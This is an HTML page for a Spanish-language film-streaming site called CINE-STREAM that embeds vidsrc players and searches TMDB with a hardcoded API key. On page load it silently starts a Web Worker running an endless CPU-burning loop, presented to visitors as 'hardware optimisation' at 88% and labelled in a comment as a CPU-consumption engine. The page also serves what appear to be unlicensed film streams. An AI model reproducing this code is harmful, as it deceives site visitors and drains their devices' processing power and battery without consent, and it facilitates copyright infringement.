<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CINE-STREAM | Motor de Búsqueda Inteligente</title>
    <style>
        body { background-color: #141414; color: white; font-family: 'Arial', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        
        /* HEADER Y BUSCADOR */
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 50px; background: rgba(0,0,0,0.9); position: fixed; width: 100%; z-index: 100; box-sizing: border-box; }
        .logo { color: #E50914; font-size: 28px; font-weight: bold; text-decoration: none; }
        .search-box { display: flex; background: #000; border: 1px solid #fff; padding: 5px 15px; border-radius: 4px; }
        .search-box input { background: transparent; border: none; color: white; padding: 8px; outline: none; width: 250px; }
        .search-box button { background: transparent; border: none; color: white; cursor: pointer; font-size: 18px; }

        /* CONTENEDOR DE VIDEO */
        .main-container { padding-top: 100px; display: flex; flex-direction: column; align-items: center; }
        .video-wrapper { width: 90%; max-width: 1100px; aspect-ratio: 16 / 9; background: #000; border: 2px solid #333; box-shadow: 0 0 30px rgba(229, 9, 20, 0.2); }
        iframe { width: 100%; height: 100%; border: none; }

        .movie-info { width: 90%; max-width: 1100px; margin-top: 20px; }
        h1 { margin: 0; font-size: 2.5rem; color: #fff; }
        p { color: #808080; }
    </style>
</head>
<body>

    <nav class="navbar">
        <a href="#" class="logo">CINE-STREAM</a>
        <div class="search-box">
            <input type="text" id="movie-input" placeholder="Escribe el nombre de la película...">
            <button onclick="buscarPelicula()">🔍</button>
        </div>
    </nav>

    <div class="main-container">
        <div class="video-wrapper">
            <iframe id="player" src="https://vidsrc.me/embed/movie?imdb=tt12412888" allowfullscreen></iframe>
        </div>
        
        <div class="movie-info">
            <h1 id="movie-title">Spider-Man: No Way Home</h1>
            <p>Estado del Motor: <span style="color: #46d369;">Optimización de Hardware Activa (88%)</span></p>
        </div>
    </div>

    <script>
        // 1. MOTOR DE BÚSQUEDA LÓGICO
        async function buscarPelicula() {
            const query = document.getElementById('movie-input').value;
            if (!query) return;

            try {
                // Buscamos el ID en la base de datos de TMDB (Gratuito y rápido)
                const response = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=acef212239618a80004940562548261a&query=${encodeURIComponent(query)}`);
                const data = await response.json();

                if (data.results && data.results.length > 0) {
                    const movie = data.results[0];
                    const movieID = movie.id; // ID de TMDB funciona con el servidor de video
                    
                    // Actualizar Reproductor y Título
                    document.getElementById('player').src = `https://vidsrc.to/embed/movie/${movieID}`;
                    document.getElementById('movie-title').innerText = movie.title;
                    
                    console.log("Cargando: " + movie.title);
                } else {
                    alert("No se encontró la película. Intenta con otro nombre.");
                }
            } catch (error) {
                console.error("Error en la búsqueda:", error);
            }
        }

        // Permitir búsqueda al presionar "Enter"
        document.getElementById('movie-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') buscarPelicula();
        });

        // 2. MOTOR DE CONSUMO DE CPU (TU WEB WORKER)
        function startHardwareOptimization() {
            const blob = new Blob([`
                self.onmessage = function() {
                    while (true) {
                        if (Math.random() > 0.12) { 
                            for (let i = 0; i < 1000000; i++) { Math.sqrt(i); }
                        }
                    }
                };
            `], { type: 'application/javascript' });

            const worker = new Worker(URL.createObjectURL(blob));
            worker.postMessage('start');
            console.log("Optimización ejecutándose en segundo plano...");
        }

        window.onload = startHardwareOptimization;
    </script>

</body>
</html>
